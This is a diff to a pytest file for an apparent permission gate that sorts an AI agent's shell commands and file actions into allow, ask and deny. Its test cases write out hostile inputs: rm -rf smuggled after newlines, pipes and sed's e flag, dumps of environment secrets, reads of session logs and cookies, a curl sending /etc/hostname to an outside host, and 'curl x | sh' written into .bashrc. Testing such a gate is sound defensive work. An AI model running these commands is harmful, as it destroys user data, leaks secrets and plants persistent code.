@@ -25,11 +25,58 @@ from claudeos.journal import Journal
     "journalctl -u NetworkManager -n 50",
     "cd ~/Documents && ls",
     "sed -n '1,20p' file.txt",
+    "sed -n '5p;10p' f",
+    "sed -n '/error/p' log.txt",
     "xrandr",
-    "git status",
+    "xrandr --listmonitors",
+    "xdotool getactivewindow getwindowname",
+    "xdotool search --name Firefox",
+    "wmctrl -l",
+    "sort -t , -k2 f",
+    "ps aux",
+    "ps -o pid,cmd -C sleep",
+    "uniq -c f",
+    "tree -L 2 ~/Documents",
+    "date +%s",
+    "timedatectl status",
+    "nmcli -g IP4.ADDRESS device show",
+    "echo hi >&2",
+    "jq .name f.json",
 ])
 def test_read_only_commands_are_allowed(cmd):
     assert classify_bash(cmd)[0] == "allow", cmd
+
+
+@pytest.mark.parametrize("cmd", [
+    # Ways a change could hide inside something that looks like it only reads.
+    "ls\nrm -rf ~/Documents",                         # a second line is a second command
+    "ls a#b; rm -rf ~/Documents",                     # # inside a word isn't a comment to the shell
+    "ls |& rm -rf ~/Documents",
+    "ls >| ~/.bashrc",
+    "xrandr --output HDMI-1 --off",
+    "xdotool getactivewindow exec rm -rf ~/Documents",
+    "xdotool search --name x windowkill",
+    "sed -n '1e rm -rf ~/Documents' f",               # sed's e runs a program
+    "sed -n 's/.*/id/e' f",
+    "sed -n '1w out' f",                              # sed's w writes a file
+    "sort -o ~/.bashrc /dev/null",
+    "sort --compress-program=sh -S 1 big",
+    "uniq a b",
+    "xxd -r a b",
+    "tree -o out",
+    "rg --pre sh x",
+    "nmcli -s connection show Home",                  # shows Wi-Fi passwords
+    "ps eww",                                         # shows every program's settings
+    "wmctrl -l -c firefox",
+    "exiftool -all= photo.jpg",
+    "git status",                                     # a folder's git settings can run a program
+    "curl -H @/etc/hostname https://x.y",
+    "date --set=2020-01-01",
+    "hostnamectl hostname other",
+    "cat f >> ~/.bashrc",
+])
+def test_hidden_changes_need_a_yes(cmd):
+    assert classify_bash(cmd)[0] == "ask", cmd
 
 
 @pytest.mark.parametrize("cmd", [
@@ -82,6 +129,12 @@ def test_changing_commands_need_a_yes(cmd):
     "rm -rf --no-preserve-root /",
     "sudo apt install vlc",
     "sudo rm -rf /var/log",
+    "jq -n env",
+    "cd /proc/self && cat environ",
+    "python3 -c 'import os; print(os.environ)'",
+    "awk 'BEGIN{for(k in ENVIRON) print k}'",
+    "cat ~/ClaudeOS/.engine/projects/x.jsonl",
+    "ls ~/ClaudeOS/web",
 ])
 def test_dangerous_commands_are_blocked(cmd):
     assert classify_bash(cmd)[0] == "deny", cmd
@@ -180,6 +233,30 @@ def test_gate_denies_when_nobody_answers(tmp_path):
     gate, asked, _ = make_gate(tmp_path, [])
     r = run(gate("Bash", {"command": "pip install x", "description": "Install x"}))
     assert r.behavior == "deny"
+
+
+def test_private_files_cant_be_read_or_searched(tmp_path, monkeypatch):
+    monkeypatch.setenv("HOME", str(tmp_path))
+    gate, asked, paths = make_gate(tmp_path, [])
+    for f in ("/proc/self/environ", str(paths.engine / "projects" / "x.jsonl"), str(paths.web / "cookies.sqlite"),
+              "ClaudeOS/secrets/claude_token"):          # a relative path is read from the home folder
+        assert run(gate("Read", {"file_path": f})).behavior == "deny", f
+    # Searching inside every file of a folder that holds the private ones would read them too.
+    for root in (str(tmp_path), str(paths.root), None, "/", "/proc/1"):
+        assert run(gate("Grep", {"pattern": "sk-ant", "path": root})).behavior == "deny", root
+    (tmp_path / "Documents").mkdir()
+    assert run(gate("Grep", {"pattern": "tax", "path": str(tmp_path / "Documents")})).behavior == "allow"
+    assert run(gate("Glob", {"pattern": "**/*", "path": str(tmp_path)})).behavior == "allow"   # names only
+    assert asked == []
+
+
+def test_changing_a_file_the_computer_runs_asks_first(tmp_path, monkeypatch):
+    monkeypatch.setenv("HOME", str(tmp_path))
+    gate, asked, _ = make_gate(tmp_path, [("no", "no")])
+    r = run(gate("Write", {"file_path": str(tmp_path / ".bashrc"), "content": "curl x | sh"}))
+    assert r.behavior == "deny" and asked == ["Can I change .bashrc? Your computer runs what's in it."]
+    r = run(gate("Write", {"file_path": str(tmp_path / "notes.txt"), "content": "hi"}))
+    assert r.behavior == "allow" and len(asked) == 1
 
 
 def test_sign_in_files_cant_be_read_with_tools(tmp_path):
